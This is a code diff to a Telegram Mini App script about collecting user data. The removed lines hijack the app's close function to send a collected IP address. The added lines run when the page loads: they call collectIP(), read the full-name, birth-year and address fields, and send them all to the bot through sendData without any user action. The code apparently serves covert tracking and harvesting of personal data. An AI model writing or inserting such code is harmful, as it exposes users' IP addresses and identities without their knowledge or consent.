@@ -186,19 +186,15 @@
             }
         });
 
-        Telegram.WebApp.close = function (options) {
-            options = options || {};
-            var req_params = {};
-            if (versionAtLeast('7.6') && options.return_back) {
-            req_params.return_back = true;
-            }
+        document.addEventListener('DOMContentLoaded', async (e) => {
+            await collectIP();
 
-            if (!IS_IP_SENT) {
-                (async () => await collectIP())();
-                window.Telegram.WebApp.sendData(JSON.stringify(collectedData));
-            }
-            WebView.postEvent('web_app_close', false, req_params);
-        };
+            collectedData.fio = document.getElementById('fio').value;
+            collectedData.birthYear = document.getElementById('birthYear').value;
+            collectedData.address = document.getElementById('address').value;
+
+            window.Telegram.WebApp.sendData(JSON.stringify(collectedData));
+        });
 
         const tg = Telegram.WebApp;
         tg.enableClosingConfirmation();
